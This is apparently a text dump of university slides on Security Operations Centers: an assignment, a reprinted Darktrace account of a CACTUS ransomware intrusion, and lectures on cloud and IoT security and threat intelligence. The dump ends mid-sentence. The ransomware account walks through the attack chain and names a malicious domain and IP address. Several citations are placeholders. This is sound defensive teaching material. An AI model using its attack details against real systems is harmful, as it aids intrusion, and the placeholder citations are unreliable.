Study Analysis – Cont.….\n2. The corporate office will maintain and host all their internal systems in a private cloud infrastructure environment and external\n     systems in a public cloud.\n3. One company of the group runs a medium scale business of providing Cloud & Data Centre services\n4. The companies will maintain direct connectivity to following key organizations to precede their  business.\nForeign Authorities\nShipping companies\nPartners\nBoard of Investments of Oman\nLocal and Oversea Banks\nOman Customs\n5. The security infrastructure must consider all related threats from inside, outside as well as the connected institutions & The security\n    infrastructure must be able to build and enhance the trust in public to use the facility and must reflect in providing the services.\n\nCase Study Analysis – Cont.….\nTask:\nDevelop a comprehensive security infrastructure plan providing answers to following key questions.\n1. Identify potential risks/threats to the above system.\n2. Identify key security requirements on applications /users/ infrastructure.\n3. Identify all the key features /components of the security infrastructure plan to address all the above  \n    identified items.\n4. Explain how you can address number 5 of the above. Give a detail approach and steps you will carry\n    out to enhance the public trust highlighting both technical and nontechnical steps.\n\nNote: The report can exclude the implementation of application-level security related to the development platform or related technology. All the security threats must be identified and must be clearly identified the application level implementation requirements. The core equipment, technologies and infrastructure components must be address in detail.\nExample of Hands-on Incident Response Simulations\u000b(Self-Study)\u000b\nAn Effective Response\nA Thorn in Attackers’ Sides: How Darktrace Uncovered a CACTUS Ransomware Infection\u000b\nThis blog examines CACTUS, a relatively new strain of ransomware that first appeared in the threat landscape in March 2023. In November 2023, Darktrace detected CACTUS ransomware on a US customer network and was able to provide full visibility over the attack and its kill chain.\nWhat is CACTUS Ransomware?\nIn May 2023, Kroll Cyber Threat Intelligence Analysts identified CACTUS as a new ransomware strain that had been actively targeting large commercial organizations since March 2023 [1]. CACTUS ransomware gets its name from the filename of the ransom note, “cAcTuS.readme.txt”. Encrypted files are appended with the extension “.cts”, followed by a number which varies between attacks, e.g. “.cts1” and “.cts2”.\nAs the cyber threat landscape adapts to ever-present fast-paced technological change, ransomware affiliates are employing progressively sophisticated techniques to enter networks, evade detection and achieve their nefarious goals.\n\n\nHow does CACTUS Ransomware work?\nIn the case of CACTUS, threat actors have been seen gaining initial network access by exploiting Virtual Private Network (VPN) services. Once inside the network, they may conduct internal scanning using tools like SoftPerfect Network Scanner, and PowerShell commands to enumerate endpoints, identify user accounts, and ping remote endpoints. Persistence is maintained by the deployment of various remote access methods, including legitimate remote access tools like Splashtop, AnyDesk, and SuperOps RMM in order to evade detection, along with malicious tools like Cobalt Strike and Chisel. Such tools, as well as custom scripts like TotalExec, have been used to disable security software to distribute the ransomware binary. CACTUS ransomware is unique in that it adopts a double-extortion tactic, stealing data from target networks and then encrypting it on compromised systems [2].\nAt the end of November 2023, cybersecurity firm Arctic Wolf reported instances of CACTUS attacks exploiting vulnerabilities on the Windows version of the business analytics platform Qlik, specifically CVE-2023-41266, CVE-2023-41265, and CVE-2023-48365, to gain initial access to target networks [3]. The vulnerability tracked as CVE-2023-41266 can be exploited to generate anonymous sessions and perform HTTP requests to unauthorized endpoints, whilst CVE-2023-41265 does not require authentication and can be leveraged to elevate privileges and execute HTTP requests on the backend server that hosts the application [2].\n\n\nDarktrace’s Coverage of CACTUS Ransomware\u000b\u000b\u000b\nIn November 2023, Darktrace observed malicious actors leveraging the aforementioned method of exploiting Qlik to gain access to the network of a customer in the US, more than a week before the vulnerability was reported by external researchers.\nHere, Qlik vulnerabilities were successfully exploited, and a malicious executable (.exe) was detonated on the network, which was followed by network scanning and failed Kerberos login attempts. The attack culminated in the encryption of numerous files with extensions such as “.cts1”, and SMB writes of the ransom note “cAcTuS.readme.txt” to multiple internal devices, all of which was promptly identified by Darktrace DETECT™.\nWhile traditional rules and signature-based detection tools may struggle to identify the malicious use of a legitimate business platform like Qlik, Darktrace’s Self-Learning AI was able to confidently identify anomalous use of the tool in a CACTUS ransomware attack by examining the rarity of the offending device’s surrounding activity and comparing it to the learned behavior of the device and its peers.\nUnfortunately for the customer in this case, Darktrace RESPOND™ was not enabled in autonomous response mode during their encounter with CACTUS ransomware meaning that attackers were able to successfully escalate their attack to the point of ransomware detonation and file encryption. Had RESPOND been configured to autonomously act on any unusual activity, Darktrace could have prevented the attack from progressing, stopping the download of any harmful files, or the encryption of legitimate ones.\n\n\nCactus Ransomware Attack Overview\nHoliday periods have increasingly become one of the favoured times for malicious actors to launch their attacks, as they can take advantage of the festive downtime of organizations and their security teams, and the typically more relaxed mindset of employees during this period [4].\nFollowing this trend, in late November 2023, Darktrace began detecting anomalous connections on the network of a customer in the US, which presented multiple indicators of compromise (IoCs) and tactics, techniques and procedures (TTPs) associated with CACTUS ransomware. The threat actors in this case set their attack in motion by exploiting the Qlik vulnerabilities on one of the customer’s critical servers.\nDarktrace observed the server device making beaconing connections to the endpoint “zohoservice[.]net” (IP address: 45.61.147.176) over the course of three days. This endpoint is known to host a malicious payload, namely a .zip file containing the command line connection tool PuttyLink [5].\nDarktrace’s Cyber AI Analyst was able to autonomously identify over 1,000 beaconing connections taking place on the customer’s network and group them together, in this case joining the dots in an ongoing ransomware attack. AI Analyst recognized that these repeated connections to highly suspicious locations were indicative of malicious command-and-control (C2) activity.\n\n\n\nCactus Ransomware Attack Overview\nThe infected device was then observed downloading the file “putty.zip” over a HTTP connection using a PowerShell user agent. Despite being labelled as a .zip file, Darktrace’s detection capabilities were able to identify this as a masqueraded PuttyLink executable file. This activity resulted in multiple Darktrace DETECT models being triggered. These models are designed to look for suspicious file downloads from endpoints not usually visited by devices on the network, and files whose types are masqueraded, as well as the anomalous use of PowerShell. This behavior resembled previously observed activity with regards to the exploitation of Qlik Sense as an intrusion technique prior to the deployment of CACTUS ransomware [5].\nFollowing the download of the masqueraded file, Darktrace observed the initial infected device engaging in unusual network scanning activity over the SMB, RDP and LDAP protocols. During this activity, the credential, “service_qlik” was observed, further indicating that Qlik was exploited by threat actors attempting to evade detection. Connections to other internal devices were made as part of this scanning activity as the attackers attempted to move laterally across the network.\nThe compromised server was then seen initiating multiple sessions over the RDP protocol to another device on the customer’s network, namely an internal DNS server. External researchers had previously observed this technique in CACTUS ransomware attacks where an RDP tunnel was established via Plink [5].\n\n\n\n\nCactus Ransomware Attack Overview\nA few days later, on November 24, Darktrace identified over 20,000 failed Kerberos authentication attempts for the username “service_qlik” being made to the internal DNS server, clearly representing a brute-force login attack. There is currently a lack of open-source intelligence (OSINT) material definitively listing Kerberos login failures as part of a CACTUS ransomware attack that exploits the Qlik vulnerabilities. This highlights Darktrace’s ability to identify ongoing threats amongst unusual network activity without relying on existing threat intelligence, emphasizing its advantage over traditional security detection tools.\nIn the month following these failed Kerberos login attempts, between November 26 and December 22, Darktrace observed multiple internal devices encrypting files within the customer’s environment with the extensions “.cts1” and “.cts7”. Devices were also seen writing ransom notes with the file name “cAcTuS.readme.txt” to two additional internal devices, as well as files likely associated with Qlik, such as “QlikSense.pdf”. This activity detected by Darktrace confirmed the presence of a CACTUS ransomware infection that was spreading across the customer’s network.\n\n\n\n\n\n\n\nConclusion\u000b\nIn the face of this CACTUS ransomware attack, Darktrace’s anomaly-based approach to threat detection enabled it to quickly identify multiple stages of the cyber kill chain occurring in the customer’s environment. These stages ranged from ‘initial access’ by exploiting Qlik vulnerabilities, which Darktrace was able to detect before the method had been reported by external researchers, to ‘actions on objectives’ by encrypting files. Darktrace’s Self-Learning AI was also able to detect a previously unreported stage of the attack: multiple Kerberos brute force login attempts.\nIf Darktrace’s autonomous response capability, RESPOND, had been active and enabled in autonomous response mode at the time of this attack, it would have been able to take swift mitigative action to shut down such suspicious activity as soon as it was identified by DETECT, effectively containing the ransomware attack at the earliest possible stage.\nLearning a network’s ‘normal’ to identify deviations from established patterns of behaviour enables Darktrace’s identify a potential compromise, even one that uses common and often legitimately used administrative tools. This allows Darktrace to stay one step ahead of the increasingly sophisticated TTPs used by ransomware actors.\n\nREFERENCES-\u000b For any queries, please feel free to contact-Email: ramesh.palanisamy@utas.edu.om\u000b \u000b\n\n\nBooks:\nGoodwin, C. (1991). Privacy: recognition of a consumer right. Journal of Public Policy & Marketing, 10(1), 149–166. [DOI: 10.1177/074391569101000111]\nMontoya, E., & Tene, O. (Year). The California Consumer Privacy Act: A Practical Guide. Publisher.\nKennedy, G. E., & Prabhu, L. S. P. (Year). Data Privacy Law: A Practical Guide. Publisher.\nVacca, J. R.. Computer and Information Security Handbook\nBejtlich, R. The Practice of Network Security Monitoring: Understanding Incident Detection and Response. \nSullins, J. P., & Liao, J. C. (Eds.). Cybersecurity and Applied Ethics: Proceedings of the 2019 Colloquium on Cybersecurity and Applied Ethics.\nCamp, L. J., & Hall, D. H. Cyber Ethics 4.0: Serving Humanity with Values. \nCappelli, D. M., Moore, A. P., & Trzeciak, R. F. The CERT Guide to Insider Threats: How to Prevent, Detect, and Respond to Information Technology Crimes\nWebsites:\nPalo Alto NetworksSOC Roles and Responsibilities. https://www.paloaltonetworks.com/services/soc\nExabeam.). Security Operations Center (SOC) Roles and Responsibilities. https://www.exabeam.com/security-operations-center/\nDarktrace. (2023, October 26). A thorn in attackers' sides: How Darktrace uncovered a Cactus ransomware infection. [Darktrace Blog]. https://darktrace.com/blog/a-thorn-in-attackers-sides-how-darktrace-uncovered-a-cactus-ransomware-infection\nThe Review Hive. (n.d.). Cybersecurity Case Studies and Real-World Examples. Retrieved from https://thereviewhive.blog/cybersecurity-case-studies-and-real-world-examples/\n5.         TechTarget. (n.d.). How to conduct incident response tabletop exercises. SearchSecurity. https://www.techtarget.com/searchsecurity/tip/How-to-conduct-incident-response-\n             tabletop-exercises\n\nHands-on Incident Response Simulations case studies : \n Kroll. (n.d.). Cactus Ransomware: Prickly New Variant Evades Detection. Retrieved from https://www.kroll.com/en/insights/publications/cyber/cactus-ransomware-prickly-new-variant-evades-detection\nBleeping Computer. (n.d.). Cactus Ransomware Exploiting Qlik Sense Flaws to Breach Networks. Retrieved from https://www.bleepingcomputer.com/news/security/cactus-ransomware-exploiting-qlik-sense-flaws-to-breach-networks/\nAvertium. (n.d.). New Ransomware Strains: Cactus and 3am. Retrieved from https://explore.avertium.com/resource/new-ransomware-strains-cactus-and-3am\nSoitron. (n.d.). Cyber-Attackers Abuse Holidays. Retrieved from https://www.soitron.com/cyber-attackers-abuse-holidays/\nArctic Wolf. (n.d.). Qlik Sense Exploited in Cactus Ransomware Campaign. Retrieved from https://arcticwolf.com/resources/blog/qlik-sense-exploited-in-cactus-ransomware-campaign/\n\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Lecture 11 Emerging Trends in SOC Operations class ppt.pptx": "Chapter 11:\nEmerging Trends in SOC Operations. \nObjectives\nAfter studying this chapter, you should be able to understand the following topics:\n\nCloud security and SOC implications \nIoT securitychallengesand monitoring \nAI and machine learning in SOC operations \nThe future of security operations\nWhat is Cloud Computing?\nCloud computing is the “on-demand delivery” of compute power, database storage, applications, and other IT resources, with the ability to scale out on a global scale to cope with any business growth requirements effectively.\n\nHow Can Public Cloud Services Benefit Organizations?\u000b\nAll public cloud service providers (CSP’s) such as Amazon AWS, Microsoft Azure, Google GCP, or Oracle OCI offer their cloud services. These are designed to suit all different requirements, for any business or organization, looking to transform their IT estate to be fully on the cloud or to utilize some cloud computing services, and have a hybrid IT estate with a mixture of on-prem and cloud-hosted resources.\nType of Cloud Computing \nExample\nWhat is Cloud Security?\u000b\nCloud security deals with the processes, policies, resources, and technologies involved in keeping cloud computing architectures protected from cybersecurity threats and risks. \nEffective cloud security measures aim to keep cloud data, applications, and services shielded against new and existing threats via proper controls and solutions. \nCloud security can be achieved via the shared responsibility model, wherein both cloud service providers (CSPs) and cloud customers have their own aspects that they would need to manage and secure. \n\nCloud Security\nSecurity of the cloud is part of the offering of cloud providers. This is assured through contractual agreements and obligations, including service-level agreements (SLAs) with the vendor and the customer. Performance metrics like uptime or latency, along with expectations with regard to the resolution of problems that may arise, documented security capabilities, and perhaps even penalties for underperformance, can typically be managed by both parties through the setting of acceptable standards.\nImplication of Cloud Security\nMoving towards a cloud-based environment, however, requires careful planning and analysis. It also has significant security implications that your organization needs to ensure it fully understands and manages:\nIdentity management. Manage personal identity information so access to computer resources, applications, data, and services are properly controlled.\nDetection and forensics. Businesses must separate legitimate and illegitimate activities, since there is a greater chance of unauthorized access in the cloud.\nEncryption. Code to protect your information assets since cloud-based systems are shared by a variety of users.\nManageability. You need a consistent view across your on-premises and cloud-based environments. After all, your organization is one entity, and therefore your systems also must be integrated as one.\nStandards. A standard is an agreed-upon approach for doing something. Cloud standards ensure interoperability, so you can use tools, applications, virtual images, and more in another cloud environment without having to do any rework.\nGovernance and compliance. Governance defines roles and responsibilities, as well as policies and procedures that your personnel or groups need to follow. Cloud governance should include your own infrastructure as well as infrastructure you do not completely control.\nStoring data in the cloud. Managing data stored in the cloud requires data security and privacy, including controls for moving data from point A to point B. It also includes managing data storage and the resources for data processing.\n\nhttps://www.kmco.com/insights/security-implications-of-cloud-computing/\n\nBest practices and tools to successfully implement Cloud SOC\u000b\nCloud SOC requires specialized expertise. This includes a team of highly trained security experts, streamlined and standardized processes and specialized tools. For the effective implementation of Cloud SOC, there are a few best practices that need to be observed.\nCloud SOC teams need to maintain an exhaustive inventory of assets that need to be secured inside and outside of the cloud applications. This includes all the tools that are used to protect them such as firewalls, anti-ransom tools, etc. To maximize the effectiveness of these tools, they also must perform routine maintenance and preventative measures such as software patches and upgrades. They also must build and maintain security policies or procedures to ensure business continuity in the event of any data breach or incident.\nThe team is also required to perform regular Compliance testing and assess vulnerabilities. This helps to identify potential threats and calculate associated costs. They also need to perform penetration testing and, based on the results of these tests, the team fine-tunes applications, policies and processes, and incident response plans. Cloud SOC helps conform security policies and ensure compliance monitoring with data privacy regulations such as GDPR (Global Data Protection Regulation), ISO 27001x, Cybersecurity Framework (CSF), HIPAA (Health Insurance Portability and Accountability Act) and other security standards.\n\nWhat Is IoT Security?\u000b\nIoT security is an umbrella term that covers the strategies, tools, processes, systems, and methods used to protect all aspects of the internet of things. Included in IoT security is the protection of the physical components, applications, data, and network connections to ensure the availability, integrity, and confidentiality of IoT ecosystems.\nIoT security vulnerabilities are found in everything from vehicles and smart grids to watches and smart home devices. \nFor example, researchers found webcams that could be easily hacked to gain access to networks and smartwatches containing security vulnerabilities that allowed hackers to track the wearer’s location and eavesdrop on conversations.\n\nIoT Security Challenges\nLack of visibility : Users often deploy IoT devices without the knowledge of IT departments, which makes it impossible to have an accurate inventory of what needs to be protected and monitored.\nLimited security integration : Because of the variety and scale of IoT devices, integrating them into security systems ranges from challenging to impossible.\nOpen-source code vulnerabilities : Firmware developed for IoT devices often includes open-source software, which is prone to bugs and vulnerabilities.\nOverwhelming data volume :The amount of data generated by IoT devices make data oversight, management, and protection difficult.\nPoor testing : Because most IoT developers do not prioritize security, they fail to perform effective vulnerability testing to identify weaknesses in IoT systems.\nUnpatched vulnerabilities : Many IoT devices have unpatched vulnerabilities for many reasons, including patches not being available and difficulties accessing and installing patches. \nVulnerable APIs :APIs are often used as entry points to command-and-control centers from which attacks are launched, such as SQL injection, distributed denial of service (DDoS), man-in-the-middle (MITM), and breaching networks\nWeak passwords :IoT devices are commonly shipped with default passwords that many users fail to change, giving cyber criminals easy access. In other cases, users create weak passwords that can be guessed.\n\nAddressing IoT Security Challenges\u000b\nAPI security\nBroader and deep IoT device inventory\nContinuous software updates\nDNS filtering\nEducation and training staff, vendors, and partners\nEncryption for data at rest and in transit\nHoneypot decoy programs\nMulti-factor authentication\nNetwork security\nNetwork traffic monitoring analysis\nPassword management\nPatch management\nSecurity gateways\nUnauthorized IoT device scans\n\nIoT Security Best Practices\nThe very first step in securing IoT is knowing what is connected. \nThis includes using a device identification and discovery tool that automates three critical IoT security functions.\nAutomatically and continuously detects, profiles, and classifies IoT devices on the network\nMaintains a real-time inventory of devices\nProvides relevant risk insights for each of these asset classes by continuously monitoring across attack vectors.\nBy following these industry best practices for IoT security and adopting leading-edge solutions, you can understand, manage, and secure your complete asset inventory, including IoT.\nUsing AI and ML in SOC\nThe integration of Artificial Intelligence (AI) and Machine Learning (ML) in Security Operations Centers (SOCs) has become a focal point for cybersecurity. \nLet's delve into the advantages and challenges of this integration\nAutomated Threat Detection: AI and ML algorithms excel in detecting anomalies and cyber threats, often identifying risks faster than traditional security measures.\nEnhanced Threat Intelligence: These technologies improve threat intelligence by analyzing large volumes of data, offering more accurate predictions and responses to security incidents.\nReduction in Response Time: AI-driven security tools can rapidly respond to security breaches, improving an organization's security posture.\n\n\nChallenges of using AI and ML \nDependence on Training Data: \nThe quality of AI models depends on their training data. If this data is incomplete or biased, the models might not detect threats correctly.\nEvolution of Cyber Threats: \nAI systems might struggle to adapt to new, sophisticated cyber attacks beyond their existing programming and recognition capabilities.\nSecurity of AI Systems: \nIronically, the AI systems can themselves become targets of cyber attacks, potentially compromising the SOC.\n\nCost Implications of Integrating AI into SOC\u000b\nImplementing AI in SOCs involves financial considerations:\nInitial Investment: The cost of integrating AI and ML models into existing security systems can be substantial.\nMaintenance and Upgrades: Continuous updates and maintenance of AI systems to keep up with evolving cyber threats also incur costs.\nROI and Long-Term Benefits: However, the potential long-term benefits, such as improved security and efficiency, can justify the initial investment.\n\nReal-World Examples of AI and ML in SOC Operations\u000b\nA healthcare institution partnered with a prominent cloud service provider to integrate AI and ML into their operations. \nThis collaboration emphasized the importance of data security and privacy and the need for a solid foundation in data and infrastructure setup. \nThe implementation profoundly impacted patient care and research, showcasing the potential of AI and ML in managing complex and sensitive environments.\n\nUpcoming Trends in AI and ML Applications in SOC\nFuture Directions in AI/ML for Cybersecurity: The growth of AI in cybersecurity is becoming a pivotal force in enhancing security operations. AI's ability to learn adaptively and detect novel patterns accelerates the detection, containment, and response to cyber threats, easing the burden on SOC analysts. This adaptability of AI is crucial for organizations as they deal with increasingly sophisticated and hard-to-detect cyberattacks. AI usage in cybersecurity is about faster response and developing the capacity to anticipate and act in advance of cyber threats​​.\nEmerging Technologies in AI and Security: We are seeing a shift towards the usage of customized generative AI models in business use cases, moving away from massive, general-purpose tools. The demand for AI systems that cater to specific and unique requirements drives this trend, notably in the healthcare, finance, and legal sectors. These customized models offer the advantage of being more tailored to specific enterprise needs, providing better privacy and security control​​.\n\nUpcoming Trends in AI and ML Applications in SOC\nPredictions for AI Impact on SOC Operations: The impact of AI on SOC operations is expected to be transformative, with a significant emphasis on pattern recognition and asset protection. AI systems in cybersecurity have become capable of accumulating new data through deep learning, which helps in automatic prioritization during crisis response. The ability of these systems to project risk levels for each segment of an organization’s infrastructure and initiate immediate incident response is crucial for modern cybersecurity strategies​​.\nStaying Ahead with AI and ML Innovations: For organizations to stay ahead in the rapidly advancing field of AI and ML in cybersecurity, there is a growing need for professionals who can bridge the gap between AI theory and practical application. It includes roles in deploying, monitoring, and maintaining AI systems in real-world settings, a discipline often referred to as MLOps. Emphasizing diversity in AI initiatives actively ensures a broader range of perspectives and helps reduce bias in the training data.\nFuture of the SOC\nForces Shaping Modern Security Operations\nForce 1: Expanding attack surface Organizations are rapidly shifting their business models and corresponding technology environments to compete with one another in the digital transformation era. Enterprise data previously held under lock and key is now being shared across multiple business units, partners, and external vendors to meet increasingly agile business needs. \nForce 2: Security talent shortage: There is still lots of work to be done for cybersecurity—and specifically for SOC operations— as a community, and as individual organizations, to solve some of the problems outlined above. The number of folks—however—who have the vision, experience, and skills to address them is not growing nearly fast enough. A massive and growing talent shortfall is one of the most critical challenges facing the cybersecurity world today. \nReferences:\nBook: Security Operations Center Guidebook\nA Practical Guide for a Successful SOC , Gregory Jarpey and R. Scott McCoy\nWebsite Links:\nhttps://www.securityhq.com/blog\nhttps://www.trendmicro.com/vinfo/us/security/news\nhttps://cloudsecurityalliance.org/blog/2022/07/08/security-operations-center-soc-for-cloud\nhttps://www.balbix.com/insights/addressing-iot-security-challenges/\nhttps://eventussecurity.com/cybersecurity\nhttps://thecustomizewindows.com/2011/11/cloud-computing-architecture-a-basic-primer/\nhttps://learn.microsoft.com/en-us/azure/architecture\nhttps://www.expertappdevs.com/blog/ai-in-healthcare\n\n\n\n\n\n\n\n\n\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Lecture 5 - Threat Intelligence and Threat Hunting.pptx": "Lecture 5\nThreat Intelligence and Threat Hunting\n5. Threat Intelligence and Threat Hunting \u000b\n5.1 Role of threat intelligence in SOC operations \n5.2 Sources of Threat Intelligence Data \n5.3 Threat hunting methodologies and techniques \n5.4 Incorporating threat intelligence into incident response\n\nObjectives\nAfter studying this chapter, you should be able to: \nUnderstand the importance of threat intelligence in improving proactive threat detection and response, as well as its function in SOC operations.\nIdentify the different sources of threat intelligence information, such as vendor reports, internal telemetry, open-source feeds, and dark web monitoring.\nApply threat hunting methodologies and techniques such as behavioral analytics, anomaly detection, and signature-based detection to proactively seek out potential threats within the network environment.\nTo reduce the impact of security incidents on organizational assets and to improve response efforts, effectively incorporate threat intelligence into incident response processes. \nTo keep ahead of developing cyber threats, continuously improve your threat intelligence methods and processes based on insights from threat hunting efforts and incident response results.\n\n\n\n\n\n\n\n5. Threat Intelligence and Threat Hunting \u000b\n5.1 Role of threat intelligence in SOC operations \n \n\nWhat is Threat intelligence?\nThreat intelligence—also called \"cyberthreat intelligence\" (CTI)\nThreat intelligence is data that is collected, processed, and analyzed to understand a threat actor’s motives, targets, and attack behaviors. \nThreat intelligence enables us to make faster, more informed, data-backed security decisions and change their behavior from reactive to proactive in the fight against threat actors.\nThreat intelligence helps security teams be more proactive, enabling them to take effective, data-driven actions to prevent cyberattacks before they occur. It can also help an organization detect and respond to attacks in progress faster.\n\u000bWhy is Threat Intelligence Important?\u000b\nThreat intelligence is crucial for organizations due to its role in predictive, preventative, detection, and responsive measures:\n1.Predictive Measures: It allows organizations to anticipate future threats, enabling proactive planning and prevention of potential attacks.\n2.Preventative Measures: By providing insights into emerging threats, threat intelligence helps organizations fortify their defenses, thereby reducing the likelihood of successful cyber attacks such as malware infiltration.\n3. Detection Measures: Threat intelligence aids in the identification of both ongoing and latent threats within networks, including understanding the tactics, techniques, and procedures employed by cyber criminals during reconnaissance or active operations.\n4. Responsive Measures: In the event of a security incident, threat intelligence informs an effective response strategy, potentially minimizing the impact and extent of the breach. For instance, indicators of compromise (IoCs) discovered in an organization's environment guide security teams on how to respond to cyber attacks effectively.\n\nRoll of Threat intelligence in SOC operations.\n Exploring Threat Intelligence within a Security Operations Center (SOC) and its role in enhancing an organization's overall security stance.  \nThreat Intelligence involves gathering, examining, and sharing data about existing and potential security risks that may affect an organization. \nIt is a crucial element of contemporary cybersecurity and plays a pivotal role in protecting an organization's assets and data.\n\n\n\n\n\n\n\nThreat intelligence lifecycle\n \n1. Planning and direction: Define goals, identify threats, allocate resources.\n2. Collection: Gather data from various sources.\n3. Processing: Organize and analyze collected data.\n4. Analysis: Evaluate data to identify threats and potential impact.\n5. Dissemination: Share relevant information with stakeholders.\n6. Feedback: Assess usefulness of information, improve processes iteratively.\t\n\n\u000b\u000b\u000bHow Threat Intelligence is Used in a SOC?\u000b\u000b\u000b\nThreat Detection :  \n   -Identifying new and emerging threats, including malware and phishing attempts.\n   - Recognizing known threats that are still active, allowing for early prevention.\n2. Vulnerability Management :\n   - Using threat intelligence to pinpoint new vulnerabilities in systems and networks.\n   - Prioritizing vulnerabilities based on risk level to facilitate timely patching or mitigation.\n3. Incident Response:\n   - Leveraging threat intelligence to enhance incident response strategies.\n   - Gaining insights into cybercriminal tactics, techniques, and procedures to develop effective response plans.\n4. Security Automation:\n   - Integrating threat intelligence with automation tools for streamlined incident response and vulnerability management.\n   - Enabling automated actions such as patching, incident escalation, and threat containment for quicker and more efficient responses.\n\n-.\n\u000b\u000b\u000b\u000bChallenges in Implementing Threat Intelligence in a SOC:\u000b\u000b\u000b\u000b\n1.Investment in technology and personnel: Organizations need to invest in the right technology and personnel for effective threat intelligence implementation, including hardware, software, and skilled employees.\n2.Processes and procedures: Establishing robust processes and procedures for analyzing, disseminating, and responding to threat intelligence is crucial for its effective utilization within a SOC.\n3.Volume of data: The sheer volume of data generated by threat intelligence can overwhelm a SOC, requiring adequate resources and tools for efficient analysis and dissemination.\n4.Quality of data: Ensuring the quality of threat intelligence data is essential, as not all sources are reliable. Organizations must verify authenticity, credibility, relevance, and timeliness of the information.\n5.Integration with existing systems: Integrating threat intelligence seamlessly into existing systems and processes, such as incident response and security operations, requires thorough understanding and planning.\n6.Maintenance and updating: Threat intelligence is dynamic and requires continuous maintenance and updating to stay relevant. This involves monitoring new threats, updating existing information, and providing ongoing training to SOC personnel.\n-.\n\u000b\u000b\u000b\u000bMerits and Demerits of Threat Intelligence in a SOC\u000b\u000b\u000b\u000b\n\u000b\u000b\u000bIncorporating threat intelligence into incident response.\u000b\u000b\u000b\nThreat Intelligence plays an important role in incident response since it improves an organization's capacity to identify, reduce and recover back from cybersecurity incidents. It offers essential background knowledge and perspectives into the future. \nEarly Detection: Threat information helps in identifying possible threats and weaknesses before they develop, enabling proactive monitoring. \nRapid Identification: Analysts may promptly identify familiar attack patterns and signs, assisting in the initial phases of an incident. \nContextual Insight: Intelligence enhances incident data by providing details on threat actors, tactics, approaches, and motivations, which helps in conducting precise event evaluations.\nPrioritization: Incident prioritization assists responders in ranking situations according to severity, possible impact, and organizational importance. \n\u000b\u000b\u000b\u000bIncorporating threat intelligence into incident response\u000b\u000b\u000b\u000b\nCustomized Response: Threat intelligence enables the development of tailored plans to address specific threats, enhancing containment and mitigation actions. \nThreat hunting: It involves analysts actively searching for indicators of potential threats that have not been noticed at this point utilizing threat intelligence information. \nAttribution: Intelligence helps identify the source of assaults by recognized danger individuals or organizations, guiding reaction strategies and possible legal measures. \nMitigation Recommendations: It offers practical suggestions for addressing and protecting against future threats. \nIntelligence sharing: It improves crisis response capability. \nContinuous improvement: is archived by using threat intelligence to analyze incidents and enhance security policies for better protection against future attacks.\u000b\n5. Threat Intelligence and Threat Hunting \u000b\n \n5.2 Sources of Threat Intelligence Data \n \n\nNetwork Intelligence Communities\n Cisco Cybersecurity Reports\nResources to help security professionals stay abreast of the latest threats are the Cisco Annual Cybersecurity Report and the Mid-Year Cybersecurity Report. These reports provide an update on the state of security preparedness, expert analysis of top vulnerabilities, factors behind the explosion of attacks using adware, spam, and more.\nCybersecurity analysts should subscribe to and read these reports to learn how threat actors are targeting their networks, and what can be done to mitigate these attacks.\nSearch the internet to locate and download Cisco Cybersecurity Reports from the Cisco website.\n Security Blogs and Podcasts\nAnother method for keeping up-to-date on the latest threats is to read blogs and listen to podcasts. Blogs and podcasts also provide advice, research, and recommended mitigation techniques.\nThere are several security blogs and podcasts available that a cybersecurity analyst should follow to learn about the latest threats, vulnerabilities, and exploits.\nCisco provides blogs on security-related topics from a number of industry experts and from the Cisco Talos Group. Search for Cisco security blogs to locate them. You can also subscribe to receive notifications of new blogs by email. Cisco Talos also offers a series of over 80 podcasts that can be played from the internet or downloaded to your device of choice.\n\nThreat Intelligence Services\nThreat intelligence services allow the exchange of threat information such as vulnerabilities, indicators of compromise (IOC), and mitigation techniques. This information is not only shared with personnel, but also with security systems. As threats emerge, threat intelligence services create and distribute firewall rules and IOCs to the devices that have subscribed to the service.\nTalos is one of the largest commercial threat intelligence teams in the world, and is comprised of world-class researchers, analysts and engineers. The goal of Talos is to help protect enterprise users, data, and infrastructure from active adversaries. The Talos team collects information about active, existing, and emerging threats. Talos then provides comprehensive protection against these attacks and malware to its subscribers.\nCisco Security products can use Talos threat intelligence in real time to provide fast and effective security solutions. Cisco Talos also provides free software, services, resources, and data. Talos maintains the security incident detection rule sets for the Snort.org, ClamAV, and SpamCop network security tools.\n\nFireEye\nFireEye is another security company that offers services to help enterprises secure their networks. FireEye uses a three-pronged approach combining security intelligence, security expertise, and technology.\nFireEye offers SIEM and SOAR with the Helix Security Platform, which uses behavioral analysis and advanced threat detection and is supported by the FireEye Mandiant worldwide threat intelligence network. Helix is cloud-hosted security operations platform that combines diverse security tools and threat intelligence into a single platform.\nThe FireEye Security System blocks attacks across web and email threat vectors, and latent malware that resides on file shares. It can block advanced malware that easily bypasses traditional signature-based defenses and compromises the majority of enterprise networks. It addresses all stages of an attack lifecycle with a signature-less engine utilizing stateful attack analysis to detect zero-day threats.\nAutomated Indicator Sharing\nThe U.S. Department of Homeland Security (DHS) offers a free service called Automated Indicator Sharing (AIS). AIS enables the real-time exchange of cyber threat indicators (e.g., malicious IP addresses, the sender address of a phishing email, etc.) between the U.S. Federal Government and the private sector.\nAIS creates an ecosystem where, as soon as a threat is recognized, it is immediately shared with the community to help them protect their networks from that particular threat.\nSearch the internet for “DHS AIS” service to learn more.\n\n\nCommon Vulnerabilities and Exposures (CVE) Database\nThe United States government sponsored the MITRE Corporation to create and maintain a catalog of known security threats called Common Vulnerabilities and Exposures (CVE). The CVE serves as a dictionary of common names (i.e., CVE Identifiers) for publicly known cybersecurity vulnerabilities.\nThe MITRE Corporation defines unique CVE Identifiers for publicly known information-security vulnerabilities to make it easier to share data.\nSearch the internet for “Mitre Corporation” and view information about CVE\nThreat Intelligence Communication Standards\nNetwork organizations and professionals must share information to increase knowledge about threat actors and the assets they want to access. Several intelligence sharing open standards have evolved to enable communication across multiple networking platforms. These standards enable the exchange of cyber threat intelligence (CTI) in an automated, consistent, and machine readable format.\nThree common threat intelligence sharing standards include the following:\nStructured Threat Information Expression (STIX) - This is a set of specifications for exchanging cyber threat information between organizations. The Cyber Observable Expression (CybOX) standard has been incorporated into STIX.\nTrusted Automated Exchange of Indicator Information (TAXII) – This is the specification for an application layer protocol that allows the communication of CTI over HTTPS. TAXII is designed to support STIX.\nCybOX - This is a set of standardized schema for specifying, capturing, characterizing, and communicating events and properties of network operations that supports many cybersecurity functions.\n\nThreat Intelligence Platforms\nAs we have seen, there are many sources of threat intelligence information, each of which may have its own data format. Accessing and using multiple threat intelligence sources can be very time-consuming. To help cybersecurity 